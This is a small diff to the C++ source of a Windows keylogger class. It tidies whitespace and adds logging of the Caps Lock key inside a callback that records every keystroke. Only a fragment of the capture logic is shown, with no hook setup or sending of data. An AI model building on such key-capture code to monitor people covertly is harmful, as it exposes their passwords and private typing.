@@ -5,13 +5,12 @@ KeyLogger::KeyLogger() {}
 KeyLogger::~KeyLogger() {}
 
 
-
 bool isShiftOn{};
 bool isCtrlOn{};
 bool isCapsOn{};
 
 // function listens to all keyboard clicks. Will be used as a thread
-LRESULT CALLBACK  KeyLogger::recordKeyboard(int nCode, WPARAM wParam, LPARAM lParam)
+LRESULT CALLBACK KeyLogger::recordKeyboard(int nCode, WPARAM wParam, LPARAM lParam)
 {
 	static int last;
 	BOOL letter = 1;
@@ -121,6 +120,9 @@ LRESULT CALLBACK  KeyLogger::recordKeyboard(int nCode, WPARAM wParam, LPARAM lPa
 				break;
 			case VK_RETURN:
 				key_event += "<enter>";
+				break;
+			case VK_CAPITAL:
+				key_event += "<caps>";
 				break;
 			case VK_OEM_MINUS: //Speical + shifts
 				if (isShiftOn == false) { key_event += "-"; }
